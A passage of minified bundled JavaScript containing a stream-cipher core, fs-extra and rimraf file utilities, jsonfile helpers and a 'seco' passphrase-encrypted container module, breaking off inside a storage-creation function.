            (h[11] ^= S(h[10] + h[9], 7)),
            (h[8] ^= S(h[11] + h[10], 9)),
            (h[9] ^= S(h[8] + h[11], 13)),
            (h[10] ^= S(h[9] + h[8], 18)),
            (h[12] ^= S(h[15] + h[14], 7)),
            (h[13] ^= S(h[12] + h[15], 9)),
            (h[14] ^= S(h[13] + h[12], 13)),
            (h[15] ^= S(h[14] + h[13], 18));
        for (t = 0; t < 16; ++t) p[t] = h[t] + p[t];
        for (t = 0; t < 16; t++) {
          var n = 4 * t;
          (e[n + 0] = (p[t] >> 0) & 255),
            (e[n + 1] = (p[t] >> 8) & 255),
            (e[n + 2] = (p[t] >> 16) & 255),
            (e[n + 3] = (p[t] >> 24) & 255);
        }
      }
      function k(e, t, n, r, o) {
        for (var i = 0; i < o; i++) n[r + i] ^= e[t + i];
      }
    };
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.encrypt = function (e, t, n) {
        const { authTag: o, iv: i, blob: s } = r.aesEncrypt(n, e);
        return (t.blob = { authTag: o, iv: i }), { blob: s, blobKey: n };
      }),
      (t.decrypt = function (e, t, n) {
        return r.aesDecrypt(n, e, t.blob);
      });
    var r = (function (e) {
      if (e && e.__esModule) return e;
      var t = {};
      if (null != e)
        for (var n in e)
          Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n]);
      return (t.default = e), t;
    })(n(66));
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback,
      o = n(7),
      i = n(1),
      s = n(20),
      c = n(34).pathExists;
    e.exports = {
      outputFile: r(function (e, t, n, r) {
        "function" == typeof n && ((r = n), (n = "utf8"));
        const a = i.dirname(e);
        c(a, (i, c) =>
          i
            ? r(i)
            : c
            ? o.writeFile(e, t, n, r)
            : void s.mkdirs(a, (i) => {
                if (i) return r(i);
                o.writeFile(e, t, n, r);
              })
        );
      }),
      outputFileSync: function (e, t, n) {
        const r = i.dirname(e);
        if (o.existsSync(r)) return o.writeFileSync.apply(o, arguments);
        s.mkdirsSync(r), o.writeFileSync.apply(o, arguments);
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7);
    e.exports = {
      symlinkType: function (e, t, n) {
        if (
          ((n = "function" == typeof t ? t : n),
          (t = "function" != typeof t && t))
        )
          return n(null, t);
        r.lstat(e, (e, r) => {
          if (e) return n(null, "file");
          (t = r && r.isDirectory() ? "dir" : "file"), n(null, t);
        });
      },
      symlinkTypeSync: function (e, t) {
        let n;
        if (t) return t;
        try {
          n = r.lstatSync(e);
        } catch (e) {
          return "file";
        }
        return n && n.isDirectory() ? "dir" : "file";
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(1),
      o = n(7),
      i = n(34).pathExists;
    e.exports = {
      symlinkPaths: function (e, t, n) {
        if (r.isAbsolute(e))
          return o.lstat(e, (t, r) =>
            t
              ? ((t.message = t.message.replace("lstat", "ensureSymlink")),
                n(t))
              : n(null, { toCwd: e, toDst: e })
          );
        {
          const s = r.dirname(t),
            c = r.join(s, e);
          return i(c, (t, i) =>
            t
              ? n(t)
              : i
              ? n(null, { toCwd: c, toDst: e })
              : o.lstat(e, (t, o) =>
                  t
                    ? ((t.message = t.message.replace(
                        "lstat",
                        "ensureSymlink"
                      )),
                      n(t))
                    : n(null, { toCwd: e, toDst: r.relative(s, e) })
                )
          );
        }
      },
      symlinkPathsSync: function (e, t) {
        let n;
        if (r.isAbsolute(e)) {
          if (!(n = o.existsSync(e)))
            throw new Error("absolute srcpath does not exist");
          return { toCwd: e, toDst: e };
        }
        {
          const i = r.dirname(t),
            s = r.join(i, e);
          if ((n = o.existsSync(s))) return { toCwd: s, toDst: e };
          if (!(n = o.existsSync(e)))
            throw new Error("relative srcpath does not exist");
          return { toCwd: e, toDst: r.relative(i, e) };
        }
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback,
      o = n(1),
      i = n(7),
      s = n(20),
      c = s.mkdirs,
      a = s.mkdirsSync,
      u = n(156),
      l = u.symlinkPaths,
      f = u.symlinkPathsSync,
      d = n(155),
      p = d.symlinkType,
      h = d.symlinkTypeSync,
      m = n(34).pathExists;
    e.exports = {
      createSymlink: r(function (e, t, n, r) {
        (r = "function" == typeof n ? n : r),
          (n = "function" != typeof n && n),
          m(t, (s, a) =>
            s
              ? r(s)
              : a
              ? r(null)
              : void l(e, t, (s, a) => {
                  if (s) return r(s);
                  (e = a.toDst),
                    p(a.toCwd, n, (n, s) => {
                      if (n) return r(n);
                      const a = o.dirname(t);
                      m(a, (n, o) =>
                        n
                          ? r(n)
                          : o
                          ? i.symlink(e, t, s, r)
                          : void c(a, (n) => {
                              if (n) return r(n);
                              i.symlink(e, t, s, r);
                            })
                      );
                    });
                })
          );
      }),
      createSymlinkSync: function (e, t, n, r) {
        if (
          ((r = "function" == typeof n ? n : r),
          (n = "function" != typeof n && n),
          i.existsSync(t))
        )
          return;
        const s = f(e, t);
        (e = s.toDst), (n = h(s.toCwd, n));
        const c = o.dirname(t);
        return i.existsSync(c)
          ? i.symlinkSync(e, t, n)
          : (a(c), i.symlinkSync(e, t, n));
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback,
      o = n(1),
      i = n(7),
      s = n(20),
      c = n(34).pathExists;
    e.exports = {
      createLink: r(function (e, t, n) {
        function r(e, t) {
          i.link(e, t, (e) => {
            if (e) return n(e);
            n(null);
          });
        }
        c(t, (a, u) =>
          a
            ? n(a)
            : u
            ? n(null)
            : void i.lstat(e, (i, a) => {
                if (i)
                  return (
                    (i.message = i.message.replace("lstat", "ensureLink")), n(i)
                  );
                const u = o.dirname(t);
                c(u, (o, i) =>
                  o
                    ? n(o)
                    : i
                    ? r(e, t)
                    : void s.mkdirs(u, (o) => {
                        if (o) return n(o);
                        r(e, t);
                      })
                );
              })
        );
      }),
      createLinkSync: function (e, t, n) {
        if (i.existsSync(t)) return;
        try {
          i.lstatSync(e);
        } catch (e) {
          throw ((e.message = e.message.replace("lstat", "ensureLink")), e);
        }
        const r = o.dirname(t);
        return i.existsSync(r)
          ? i.linkSync(e, t)
          : (s.mkdirsSync(r), i.linkSync(e, t));
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback,
      o = n(1),
      i = n(7),
      s = n(20),
      c = n(34).pathExists;
    e.exports = {
      createFile: r(function (e, t) {
        function n() {
          i.writeFile(e, "", (e) => {
            if (e) return t(e);
            t();
          });
        }
        i.stat(e, (r, i) => {
          if (!r && i.isFile()) return t();
          const a = o.dirname(e);
          c(a, (e, r) =>
            e
              ? t(e)
              : r
              ? n()
              : void s.mkdirs(a, (e) => {
                  if (e) return t(e);
                  n();
                })
          );
        });
      }),
      createFileSync: function (e) {
        let t;
        try {
          t = i.statSync(e);
        } catch (e) {}
        if (t && t.isFile()) return;
        const n = o.dirname(e);
        i.existsSync(n) || s.mkdirsSync(n), i.writeFileSync(e, "");
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(159),
      o = n(158),
      i = n(157);
    e.exports = {
      createFile: r.createFile,
      createFileSync: r.createFileSync,
      ensureFile: r.createFile,
      ensureFileSync: r.createFileSync,
      createLink: o.createLink,
      createLinkSync: o.createLinkSync,
      ensureLink: o.createLink,
      ensureLinkSync: o.createLinkSync,
      createSymlink: i.createSymlink,
      createSymlinkSync: i.createSymlinkSync,
      ensureSymlink: i.createSymlink,
      ensureSymlinkSync: i.createSymlinkSync,
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback,
      o = n(30),
      i = n(1),
      s = n(20),
      c = n(54),
      a = r(function (e, t) {
        (t = t || function () {}),
          o.readdir(e, (n, r) => {
            if (n) return s.mkdirs(e, t);
            (r = r.map((t) => i.join(e, t))),
              (function e() {
                const n = r.pop();
                if (!n) return t();
                c.remove(n, (n) => {
                  if (n) return t(n);
                  e();
                });
              })();
          });
      });
    function u(e) {
      let t;
      try {
        t = o.readdirSync(e);
      } catch (t) {
        return s.mkdirsSync(e);
      }
      t.forEach((t) => {
        (t = i.join(e, t)), c.removeSync(t);
      });
    }
    e.exports = { emptyDirSync: u, emptydirSync: u, emptyDir: a, emptydir: a };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(88).copySync,
      s = n(54).removeSync,
      c = n(20).mkdirsSync,
      a = n(87);
    function u(e, t, n) {
      return r.statSync(e).isDirectory()
        ? (function (e, t, n) {
            const r = { overwrite: !1 };
            n ? (s(t), o()) : o();
            function o() {
              return i(e, t, r), s(e);
            }
          })(e, t, n)
        : (function (e, t, n) {
            const o = a(65536),
              i = n ? "w" : "wx",
              s = r.openSync(e, "r"),
              c = r.fstatSync(s),
              u = r.openSync(t, i, c.mode);
            let l = 1,
              f = 0;
            for (; l > 0; )
              (l = r.readSync(s, o, 0, 65536, f)),
                r.writeSync(u, o, 0, l),
                (f += l);
            return r.closeSync(s), r.closeSync(u), r.unlinkSync(e);
          })(e, t, n);
    }
    e.exports = {
      moveSync: function e(t, n, i) {
        const a = (i = i || {}).overwrite || i.clobber || !1;
        if (((t = o.resolve(t)), (n = o.resolve(n)), t === n))
          return r.accessSync(t);
        if (
          (function (e, t) {
            try {
              return (
                r.statSync(e).isDirectory() &&
                e !== t &&
                t.indexOf(e) > -1 &&
                t.split(o.dirname(e) + o.sep)[1].split(o.sep)[0] ===
                  o.basename(e)
              );
            } catch (e) {
              return !1;
            }
          })(t, n)
        )
          throw new Error(`Cannot move '${t}' into itself '${n}'.`);
        c(o.dirname(n)),
          (function () {
            if (a)
              try {
                r.renameSync(t, n);
              } catch (r) {
                if (
                  "ENOTEMPTY" === r.code ||
                  "EEXIST" === r.code ||
                  "EPERM" === r.code
                )
                  return s(n), (i.overwrite = !1), e(t, n, i);
                if ("EXDEV" !== r.code) throw r;
                return u(t, n, a);
              }
            else
              try {
                r.linkSync(t, n), r.unlinkSync(t);
              } catch (e) {
                if (
                  "EXDEV" === e.code ||
                  "EISDIR" === e.code ||
                  "EPERM" === e.code ||
                  "ENOTSUP" === e.code
                )
                  return u(t, n, a);
                throw e;
              }
          })();
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback,
      o = n(7),
      i = n(91),
      s = n(1),
      c = n(54).remove,
      a = n(20).mkdirs;
    function u(e, t, n, r) {
      o.stat(e, (i, s) => {
        if (i) return r(i);
        s.isDirectory()
          ? l(e, t, n, r)
          : (function (e, t, n, r) {
              const i = n ? "w" : "wx",
                s = o.createReadStream(e),
                c = o.createWriteStream(t, { flags: i });
              function a() {
                o.unlink(e, r);
              }
              s.on("error", (i) => {
                s.destroy(),
                  c.destroy(),
                  c.removeListener("close", a),
                  o.unlink(t, () => {
                    "EISDIR" === i.code || "EPERM" === i.code
                      ? l(e, t, n, r)
                      : r(i);
                  });
              }),
                c.on("error", (e) => {
                  s.destroy(), c.destroy(), c.removeListener("close", a), r(e);
                }),
                c.once("close", a),
                s.pipe(c);
            })(e, t, n, r);
      });
    }
    function l(e, t, n, r) {
      const o = { overwrite: !1 };
      function s() {
        i(e, t, o, (t) => {
          if (t) return r(t);
          c(e, r);
        });
      }
      n
        ? c(t, (e) => {
            if (e) return r(e);
            s();
          })
        : s();
    }
    e.exports = {
      move: r(function e(t, n, r, i) {
        "function" == typeof r && ((i = r), (r = {}));
        const l = r.overwrite || r.clobber || !1;
        !(function (e, t, n) {
          o.stat(e, (r, o) => {
            if (r) return n(r);
            if (o.isDirectory()) {
              const r = t.split(s.dirname(e) + s.sep)[1];
              if (r) {
                const o = r.split(s.sep)[0];
                return n(
                  null,
                  !!o && e !== t && t.indexOf(e) > -1 && o === s.basename(e)
                );
              }
              return n(null, !1);
            }
            return n(null, !1);
          });
        })(t, n, (f, d) =>
          f
            ? i(f)
            : d
            ? i(
                new Error(
                  `Cannot move '${t}' to a subdirectory of itself, '${n}'.`
                )
              )
            : void a(s.dirname(n), (a) => {
                if (a) return i(a);
                s.resolve(t) === s.resolve(n)
                  ? o.access(t, i)
                  : l
                  ? o.rename(t, n, (o) => {
                      if (!o) return i();
                      if ("ENOTEMPTY" !== o.code && "EEXIST" !== o.code) {
                        if ("EPERM" !== o.code)
                          return "EXDEV" !== o.code ? i(o) : void u(t, n, l, i);
                        setTimeout(() => {
                          c(n, (o) => {
                            if (o) return i(o);
                            (r.overwrite = !1), e(t, n, r, i);
                          });
                        }, 200);
                      } else
                        c(n, (o) => {
                          if (o) return i(o);
                          (r.overwrite = !1), e(t, n, r, i);
                        });
                    })
                  : o.link(t, n, (e) =>
                      e
                        ? "EXDEV" === e.code ||
                          "EISDIR" === e.code ||
                          "EPERM" === e.code ||
                          "ENOTSUP" === e.code
                          ? u(t, n, l, i)
                          : i(e)
                        : o.unlink(t, i)
                    );
              })
        );
      }),
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(20),
      s = n(67);
    e.exports = function (e, t, n) {
      const c = o.dirname(e);
      r.existsSync(c) || i.mkdirsSync(c), s.writeJsonSync(e, t, n);
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(1),
      o = n(20),
      i = n(34).pathExists,
      s = n(67);
    e.exports = function (e, t, n, c) {
      "function" == typeof n && ((c = n), (n = {}));
      const a = r.dirname(e);
      i(a, (r, i) =>
        r
          ? c(r)
          : i
          ? s.writeJson(e, t, n, c)
          : void o.mkdirs(a, (r) => {
              if (r) return c(r);
              s.writeJson(e, t, n, c);
            })
      );
    };
  },
  function (e, t, n) {
    var r;
    try {
      r = n(7);
    } catch (e) {
      r = n(30);
    }
    function o(e, t) {
      var n,
        r = "\n";
      return (
        "object" == typeof t &&
          null !== t &&
          (t.spaces && (n = t.spaces), t.EOL && (r = t.EOL)),
        JSON.stringify(e, t ? t.replacer : null, n).replace(/\n/g, r) + r
      );
    }
    function i(e) {
      return (
        Buffer.isBuffer(e) && (e = e.toString("utf8")),
        (e = e.replace(/^\uFEFF/, ""))
      );
    }
    var s = {
      readFile: function (e, t, n) {
        null == n && ((n = t), (t = {})),
          "string" == typeof t && (t = { encoding: t });
        var o = (t = t || {}).fs || r,
          s = !0;
        "throws" in t && (s = t.throws),
          o.readFile(e, t, function (r, o) {
            if (r) return n(r);
            var c;
            o = i(o);
            try {
              c = JSON.parse(o, t ? t.reviver : null);
            } catch (t) {
              return s
                ? ((t.message = e + ": " + t.message), n(t))
                : n(null, null);
            }
            n(null, c);
          });
      },
      readFileSync: function (e, t) {
        "string" == typeof (t = t || {}) && (t = { encoding: t });
        var n = t.fs || r,
          o = !0;
        "throws" in t && (o = t.throws);
        try {
          var s = n.readFileSync(e, t);
          return (s = i(s)), JSON.parse(s, t.reviver);
        } catch (t) {
          if (o) throw ((t.message = e + ": " + t.message), t);
          return null;
        }
      },
      writeFile: function (e, t, n, i) {
        null == i && ((i = n), (n = {}));
        var s = (n = n || {}).fs || r,
          c = "";
        try {
          c = o(t, n);
        } catch (e) {
          return void (i && i(e, null));
        }
        s.writeFile(e, c, n, i);
      },
      writeFileSync: function (e, t, n) {
        var i = (n = n || {}).fs || r,
          s = o(t, n);
        return i.writeFileSync(e, s, n);
      },
    };
    e.exports = s;
  },
  function (e, t, n) {
    "use strict";
    const r = n(17).fromCallback,
      o = n(67);
    (o.outputJson = r(n(165))),
      (o.outputJsonSync = n(164)),
      (o.outputJSON = o.outputJson),
      (o.outputJSONSync = o.outputJsonSync),
      (o.writeJSON = o.writeJson),
      (o.writeJSONSync = o.writeJsonSync),
      (o.readJSON = o.readJson),
      (o.readJSONSync = o.readJsonSync),
      (e.exports = o);
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(71),
      s = "win32" === process.platform;
    function c(e) {
      ["unlink", "chmod", "stat", "lstat", "rmdir", "readdir"].forEach((t) => {
        (e[t] = e[t] || r[t]), (e[(t += "Sync")] = e[t] || r[t]);
      }),
        (e.maxBusyTries = e.maxBusyTries || 3);
    }
    function a(e, t, n) {
      let r = 0;
      "function" == typeof t && ((n = t), (t = {})),
        i(e, "rimraf: missing path"),
        i.equal(typeof e, "string", "rimraf: path should be a string"),
        i.equal(typeof n, "function", "rimraf: callback function required"),
        i(t, "rimraf: invalid options argument provided"),
        i.equal(typeof t, "object", "rimraf: options should be object"),
        c(t),
        u(e, t, function o(i) {
          if (i) {
            if (
              ("EBUSY" === i.code ||
                "ENOTEMPTY" === i.code ||
                "EPERM" === i.code) &&
              r < t.maxBusyTries
            ) {
              return r++, setTimeout(() => u(e, t, o), 100 * r);
            }
            "ENOENT" === i.code && (i = null);
          }
          n(i);
        });
    }
    function u(e, t, n) {
      i(e),
        i(t),
        i("function" == typeof n),
        t.lstat(e, (r, o) =>
          r && "ENOENT" === r.code
            ? n(null)
            : r && "EPERM" === r.code && s
            ? l(e, t, r, n)
            : o && o.isDirectory()
            ? d(e, t, r, n)
            : void t.unlink(e, (r) => {
                if (r) {
                  if ("ENOENT" === r.code) return n(null);
                  if ("EPERM" === r.code)
                    return s ? l(e, t, r, n) : d(e, t, r, n);
                  if ("EISDIR" === r.code) return d(e, t, r, n);
                }
                return n(r);
              })
        );
    }
    function l(e, t, n, r) {
      i(e),
        i(t),
        i("function" == typeof r),
        n && i(n instanceof Error),
        t.chmod(e, 438, (o) => {
          o
            ? r("ENOENT" === o.code ? null : n)
            : t.stat(e, (o, i) => {
                o
                  ? r("ENOENT" === o.code ? null : n)
                  : i.isDirectory()
                  ? d(e, t, n, r)
                  : t.unlink(e, r);
              });
        });
    }
    function f(e, t, n) {
      let r;
      i(e), i(t), n && i(n instanceof Error);
      try {
        t.chmodSync(e, 438);
      } catch (e) {
        if ("ENOENT" === e.code) return;
        throw n;
      }
      try {
        r = t.statSync(e);
      } catch (e) {
        if ("ENOENT" === e.code) return;
        throw n;
      }
      r.isDirectory() ? h(e, t, n) : t.unlinkSync(e);
    }
    function d(e, t, n, r) {
      i(e),
        i(t),
        n && i(n instanceof Error),
        i("function" == typeof r),
        t.rmdir(e, (s) => {
          !s ||
          ("ENOTEMPTY" !== s.code && "EEXIST" !== s.code && "EPERM" !== s.code)
            ? s && "ENOTDIR" === s.code
              ? r(n)
              : r(s)
            : (function (e, t, n) {
                i(e),
                  i(t),
                  i("function" == typeof n),
                  t.readdir(e, (r, i) => {
                    if (r) return n(r);
                    let s,
                      c = i.length;
                    if (0 === c) return t.rmdir(e, n);
                    i.forEach((r) => {
                      a(o.join(e, r), t, (r) => {
                        if (!s)
                          return r
                            ? n((s = r))
                            : void (0 == --c && t.rmdir(e, n));
                      });
                    });
                  });
              })(e, t, r);
        });
    }
    function p(e, t) {
      let n;
      c((t = t || {})),
        i(e, "rimraf: missing path"),
        i.equal(typeof e, "string", "rimraf: path should be a string"),
        i(t, "rimraf: missing options"),
        i.equal(typeof t, "object", "rimraf: options should be object");
      try {
        n = t.lstatSync(e);
      } catch (n) {
        if ("ENOENT" === n.code) return;
        "EPERM" === n.code && s && f(e, t, n);
      }
      try {
        n && n.isDirectory() ? h(e, t, null) : t.unlinkSync(e);
      } catch (n) {
        if ("ENOENT" === n.code) return;
        if ("EPERM" === n.code) return s ? f(e, t, n) : h(e, t, n);
        if ("EISDIR" !== n.code) throw n;
        h(e, t, n);
      }
    }
    function h(e, t, n) {
      i(e), i(t), n && i(n instanceof Error);
      try {
        t.rmdirSync(e);
      } catch (r) {
        if ("ENOTDIR" === r.code) throw n;
        if ("ENOTEMPTY" === r.code || "EEXIST" === r.code || "EPERM" === r.code)
          !(function (e, t) {
            i(e), i(t), t.readdirSync(e).forEach((n) => p(o.join(e, n), t));
            const n = s ? 100 : 1;
            let r = 0;
            for (;;) {
              let o = !0;
              try {
                const i = t.rmdirSync(e, t);
                return (o = !1), i;
              } finally {
                if (++r < n && o) continue;
              }
            }
          })(e, t);
        else if ("ENOENT" !== r.code) throw r;
      }
    }
    (e.exports = a), (a.sync = p);
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(20).mkdirsSync,
      s = n(89).utimesMillisSync,
      c = Symbol("notExist"),
      a = Symbol("existsReg");
    function u(e, t, n) {
      if (!n.filter || n.filter(e, t))
        return (function (e, t, n) {
          const i = (n.dereference ? r.statSync : r.lstatSync)(e);
          if (i.isDirectory())
            return (function (e, t, n, o) {
              const i = p(n);
              if (i === c) {
                if (h(t, n))
                  throw new Error(
                    `Cannot copy '${t}' to a subdirectory of itself, '${n}'.`
                  );
                return (function (e, t, n, o) {
                  return (
                    r.mkdirSync(n, e.mode), r.chmodSync(n, e.mode), d(t, n, o)
                  );
                })(e, t, n, o);
              }
              if (i === a) {
                if (h(t, n))
                  throw new Error(
                    `Cannot copy '${t}' to a subdirectory of itself, '${n}'.`
                  );
                return (function (e, t, n) {
                  if (!r.statSync(t).isDirectory())
                    throw new Error(
                      `Cannot overwrite non-directory '${t}' with directory '${e}'.`
                    );
                  return d(e, t, n);
                })(t, n, o);
              }
              if (t === i) return;
              return d(t, n, o);
            })(i, e, t, n);
          if (i.isFile() || i.isCharacterDevice() || i.isBlockDevice())
            return (function (e, t, n, r) {
              const o = p(n);
              if (o === c) return f(e, t, n, r);
              if (o === a) return l(e, t, n, r);
              if (t === o) return;
              return l(e, t, n, r);
            })(i, e, t, n);
          if (i.isSymbolicLink())
            return (function (e, t, n) {
              let i = r.readlinkSync(e);
              n.dereference && (i = o.resolve(process.cwd(), i));
              let s = p(t);
              if (s === c || s === a) return r.symlinkSync(i, t);
              if ((n.dereference && (s = o.resolve(process.cwd(), s)), s === i))
                return;
              if (r.statSync(t).isDirectory() && h(s, i))
                throw new Error(`Cannot overwrite '${s}' with '${i}'.`);
              return (function (e, t) {
                return r.unlinkSync(t), r.symlinkSync(e, t);
              })(i, t);
            })(e, t, n);
        })(e, t, n);
    }
    function l(e, t, n, o) {
      if (o.overwrite) return r.unlinkSync(n), f(e, t, n, o);
      if (o.errorOnExist) throw new Error(`'${n}' already exists`);
    }
    function f(e, t, o, i) {
      return "function" == typeof r.copyFileSync
        ? (r.copyFileSync(t, o),
          r.chmodSync(o, e.mode),
          i.preserveTimestamps ? s(o, e.atime, e.mtime) : void 0)
        : (function (e, t, o, i) {
            const s = n(87)(65536),
              c = r.openSync(t, "r"),
              a = r.openSync(o, "w", e.mode);
            let u = 1,
              l = 0;
            for (; u > 0; )
              (u = r.readSync(c, s, 0, 65536, l)),
                r.writeSync(a, s, 0, u),
                (l += u);
            i.preserveTimestamps && r.futimesSync(a, e.atime, e.mtime);
            r.closeSync(c), r.closeSync(a);
          })(e, t, o, i);
    }
    function d(e, t, n) {
      r.readdirSync(e).forEach((r) => {
        u(o.join(e, r), o.join(t, r), n);
      });
    }
    function p(e) {
      let t;
      try {
        t = r.readlinkSync(e);
      } catch (e) {
        if ("ENOENT" === e.code) return c;
        if ("EINVAL" === e.code || "UNKNOWN" === e.code) return a;
        throw e;
      }
      return t;
    }
    function h(e, t) {
      const n = t.split(o.dirname(e) + o.sep)[1];
      if (n) {
        const r = n.split(o.sep)[0];
        return !!r && e !== t && t.indexOf(e) > -1 && r === o.basename(e);
      }
      return !1;
    }
    e.exports = function (e, t, n) {
      if (
        ("function" == typeof n && (n = { filter: n }),
        ((n = n || {}).clobber = !("clobber" in n && !n.clobber)),
        (n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber),
        n.preserveTimestamps &&
          "ia32" === process.arch &&
          console.warn(
            "fs-extra: Using the preserveTimestamps option in 32-bit node is not recommended;\n\n    see https://github.com/jprichardson/node-fs-extra/issues/269"
          ),
        (e = o.resolve(e)) === (t = o.resolve(t)))
      )
        throw new Error("Source and destination must not be the same.");
      if (n.filter && !n.filter(e, t)) return;
      const s = o.dirname(t);
      return r.existsSync(s) || i(s), u(e, t, n);
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(90).invalidWin32Path,
      s = parseInt("0777", 8);
    e.exports = function e(t, n, c) {
      (n && "object" == typeof n) || (n = { mode: n });
      let a = n.mode;
      const u = n.fs || r;
      if ("win32" === process.platform && i(t)) {
        const e = new Error(t + " contains invalid WIN32 path characters.");
        throw ((e.code = "EINVAL"), e);
      }
      void 0 === a && (a = s & ~process.umask()),
        c || (c = null),
        (t = o.resolve(t));
      try {
        u.mkdirSync(t, a), (c = c || t);
      } catch (r) {
        switch (r.code) {
          case "ENOENT":
            if (o.dirname(t) === t) throw r;
            (c = e(o.dirname(t), n, c)), e(t, n, c);
            break;
          default:
            let i;
            try {
              i = u.statSync(t);
            } catch (e) {
              throw r;
            }
            if (!i.isDirectory()) throw r;
        }
      }
      return c;
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(7),
      o = n(1),
      i = n(90).invalidWin32Path,
      s = parseInt("0777", 8);
    e.exports = function e(t, n, c, a) {
      if (
        ("function" == typeof n
          ? ((c = n), (n = {}))
          : (n && "object" == typeof n) || (n = { mode: n }),
        "win32" === process.platform && i(t))
      ) {
        const e = new Error(t + " contains invalid WIN32 path characters.");
        return (e.code = "EINVAL"), c(e);
      }
      let u = n.mode;
      const l = n.fs || r;
      void 0 === u && (u = s & ~process.umask()),
        a || (a = null),
        (c = c || function () {}),
        (t = o.resolve(t)),
        l.mkdir(t, u, (r) => {
          if (!r) return c(null, (a = a || t));
          switch (r.code) {
            case "ENOENT":
              if (o.dirname(t) === t) return c(r);
              e(o.dirname(t), n, (r, o) => {
                r ? c(r, o) : e(t, n, c, o);
              });
              break;
            default:
              l.stat(t, (e, t) => {
                e || !t.isDirectory() ? c(r, a) : c(null, a);
              });
          }
        });
    };
  },
  function (e, t, n) {
    const r = n(17).fromCallback;
    e.exports = { copy: r(n(91)) };
  },
  function (e, t, n) {
    "use strict";
    e.exports = function () {
      const e = [].slice.call(arguments).filter((e) => e),
        t = e.shift();
      return (
        e.forEach((e) => {
          Object.keys(e).forEach((n) => {
            t[n] = e[n];
          });
        }),
        t
      );
    };
  },
  function (e, t, n) {
    "use strict";
    const r = n(173),
      o = {};
    r(o, n(92)),
      r(o, n(172)),
      r(o, n(88)),
      r(o, n(20)),
      r(o, n(54)),
      r(o, n(167)),
      r(o, n(163)),
      r(o, n(162)),
      r(o, n(161)),
      r(o, n(160)),
      r(o, n(154)),
      r(o, n(34)),
      (e.exports = o);
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.read = t.write = void 0);
    var r =
      Object.assign ||
      function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n)
            Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      };
    t.write =
      ((o = m(function* (e, t, n = {}) {
        if (
          !(n = r({ overwrite: !1 }, n)).overwrite &&
          (yield a.default.pathExists(e))
        )
          throw new Error(`${e} exists. Set 'overwrite' to true.`);
        var o = y(t, n);
        const i = o.encryptedData,
          s = o.blobKey,
          c = o.metadata;
        return yield a.default.outputFile(e, i), { blobKey: s, metadata: c };
      })),
      function (e, t) {
        return o.apply(this, arguments);
      });
    var o;
    t.read =
      ((i = m(function* (e, t) {
        let n,
          r = yield a.default.readFile(e);
        try {
          n = w(r, t);
        } catch (t) {
          if (
            t.message.match(
              /seco checksum does not match; data may be corrupted/
            )
          )
            throw new Error(
              `${e}: seco checksum does not match; file may be corrupted`
            );
          throw t;
        }
        return n;
      })),
      function (e, t) {
        return i.apply(this, arguments);
      });
    var i;
    (t.encryptData = y), (t.decryptData = w);
    var s,
      c = n(174),
      a = (s = c) && s.__esModule ? s : { default: s },
      u = h(n(31)),
      l = h(n(153)),
      f = h(n(86)),
      d = h(n(83)),
      p = h(n(82));
    function h(e) {
      if (e && e.__esModule) return e;
      var t = {};
      if (null != e)
        for (var n in e)
          Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n]);
      return (t.default = e), t;
    }
    function m(e) {
      return function () {
        var t = e.apply(this, arguments);
        return new Promise(function (e, n) {
          return (function r(o, i) {
            try {
              var s = t[o](i),
                c = s.value;
            } catch (e) {
              return void n(e);
            }
            if (!s.done)
              return Promise.resolve(c).then(
                function (e) {
                  r("next", e);
                },
                function (e) {
                  r("throw", e);
                }
              );
            e(c);
          })("next");
        });
      };
    }
    function y(e, t = {}) {
      t.header || console.warn("seco-file: should pass options.header.");
      let n,
        r,
        o = f.create(t.header);
      if (t.passphrase)
        (n = u.randomBytes(32)),
          (r = d.create()),
          d.encryptBlobKey(r, t.passphrase, n);
      else {
        if (!t.metadata || !t.blobKey)
          throw new Error(
            "Must set either passphrase or (metadata and blobKey)"
          );
        (n = t.blobKey), (r = t.metadata);
      }
      e = Buffer.isBuffer(e) ? e : Buffer.from(e, "utf8");
      let i = l.encrypt(e, r, n).blob;
      const s = f.serialize(o),
        c = d.serialize(r);
      let a = {
        header: s,
        checksum: p.computeChecksum(c, i),
        metadata: c,
        blob: i,
      };
      return { encryptedData: p.encode(a), blobKey: n, metadata: r };
    }
    function w(e, t) {
      const n = p.decode(e),
        r = p.computeChecksum(n.metadata, n.blob);
      if (!n.checksum.equals(r))
        throw new Error("seco checksum does not match; data may be corrupted");
      let o = d.decode(n.metadata),
        i = d.decryptBlobKey(o, t),
        s = f.decode(n.header);
      return {
        data: l.decrypt(n.blob, o, i),
        blobKey: i,
        metadata: o,
        header: s,
      };
    }
  },
  function (e, t, n) {
    const r = n(9),
      { gzipSync: o, gunzipSync: i } = n(73),
      s = n(175),
      { checkContents: c } = n(82),
      a = n(141),
      u = n(140),
      l = n(139),
      f = n(138),
      { getLockFile: d, getTmpFile: p, getFlagFile: h } = n(81),
      { expand: m, shrink: y } = a(32768);
    e.exports = {
      createStorageInternal: function ({
        file: e,
        getSecoPassphrase: t,
        header: n,
        expandTo32k: a = !1,
      }) {
        const f = d(e),
